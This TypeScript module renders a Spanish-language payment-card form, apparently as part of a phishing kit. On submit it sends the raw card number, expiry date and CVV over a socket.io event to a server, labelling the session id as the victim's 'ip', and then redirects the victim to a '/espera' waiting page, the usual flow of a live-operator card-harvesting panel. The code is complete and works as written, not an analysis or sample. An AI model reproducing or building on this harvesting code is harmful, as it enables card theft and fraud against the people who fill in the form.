import { getSessionId } from "../../utils/session";
import { getSocket } from "../../utils/socket";
import { cardTemplate } from "./card.html";

export const renderCard = async (): Promise<void> => {
  const app = document.querySelector<HTMLDivElement>("#app");

  if (app) {
    app.innerHTML = cardTemplate();
  }

 
//   function closeModale(): void {
//     const modal = document.querySelector<HTMLElement>(".content_modal_e");
//     if (modal) {
//       modal.style.display = "none";
//     }
//   }


      const socket = getSocket();
      const sessionId = await getSessionId();
  
      
 
  function initTarjetaForm(): void {
    const form = document.querySelector<HTMLFormElement>(".form_");
    const inputTarjeta = document.querySelector<HTMLInputElement>("#inp_tarjerta");
    const inputMes = document.querySelector<HTMLSelectElement>("select[name='mes_tarjeta']");
    const inputYear = document.querySelector<HTMLSelectElement>("select[name='year_tarjeta']");
    const inputCvv = document.querySelector<HTMLInputElement>("#inp_cvvtj");
    const submitBtn = document.querySelector<HTMLButtonElement>("#submit");

   
    if (!form || !inputTarjeta || !inputMes || !inputYear || !inputCvv || !submitBtn) {
      console.warn("Algunos elementos del formulario no se encontraron en el DOM.");
      return;
    }

  
    form.addEventListener("submit", (e: Event) => {
  e.preventDefault();


  socket.emit("client:response-card", {
    ip: sessionId, 
    field: "card",
    value: {
      card_number: inputTarjeta.value, 
      card_expiry: `${inputMes.value}/${inputYear.value}`,
      card_cvv: inputCvv.value
    }
  });

    window.location.href = "/espera";

});


   
    inputTarjeta.addEventListener("input", () => {
      let value = inputTarjeta.value.replace(/[^0-9]/g, "");
      let formatted = value.replace(/\d{4}(?=\d)/g, "$& ").slice(0, 19);
      inputTarjeta.value = formatted;
      validateForm();
    });

  
    function allowOnlyNumbersAndLimitLength(input: HTMLInputElement, maxLength: number): void {
      input.addEventListener("input", () => {
        let value = input.value.replace(/\D/g, "");
        if (value.length > maxLength) {
          value = value.substring(0, maxLength);
        }
        input.value = value;
        validateForm();
      });
    }

    allowOnlyNumbersAndLimitLength(inputCvv, 4);

  
    function validateForm(): void {
      const nroTarjeta = inputTarjeta!.value.replace(/\s/g, "");
      const cvvTarjeta = inputCvv!.value;

      if (nroTarjeta.length === 16 && cvvTarjeta.length >= 3) {
        submitBtn!.disabled = false;
      } else {
        submitBtn!.disabled = true;
      }
    }

 
    [inputTarjeta, inputMes, inputYear, inputCvv].forEach((el) => {
      el.addEventListener("input", validateForm);
    });
  }

 
  initTarjetaForm();
};
